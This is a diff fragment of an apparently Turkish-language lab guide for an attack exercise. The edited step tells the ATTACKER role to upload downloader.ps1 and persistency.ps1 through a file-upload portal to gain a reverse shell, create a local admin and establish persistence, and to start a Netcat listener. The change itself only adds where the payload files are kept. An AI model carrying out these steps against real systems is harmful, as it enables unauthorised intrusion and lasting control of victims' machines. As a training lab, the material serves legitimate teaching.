@@ -197,7 +197,7 @@ Client1.exe &lt;VICTIM-IP&gt; localhost</code></pre><button class="copy" data-ta
 <section class="sec" id="s2"><h2 class="sec-title">2. Persistency</h2>
 <p>Portaldan dosya yükler, reverse shell alır, local admin açar ve persistence kurarsınız.</p>
 <ul>
-<li><span class="role role-atk">ATTACKER</span> index.html → <strong>File-Upload</strong> ile önce <code>downloader.ps1</code>, sonra <code>persistency.ps1</code>'i yükleyin. Yüklediğiniz dosyalar VICTIM'da <code>C:\x_test\server\ud</code> altında belirir.</li>
+<li><span class="role role-atk">ATTACKER</span> index.html → <strong>File-Upload</strong> ile önce <code>downloader.ps1</code>, sonra <code>persistency.ps1</code>'i yükleyin. İki dosya ATTACKER masaüstünde <strong>UTD-payloads</strong> klasöründe hazırdır. Yüklediğiniz dosyalar VICTIM'da <code>C:\x_test\server\ud</code> altında belirir.</li>
 <li><span class="role role-atk">ATTACKER</span> Netcat'i dinlemeye alın:</li>
 </ul>
 <div class="code"><pre id="c2a"><code>cd C:\x_test\client
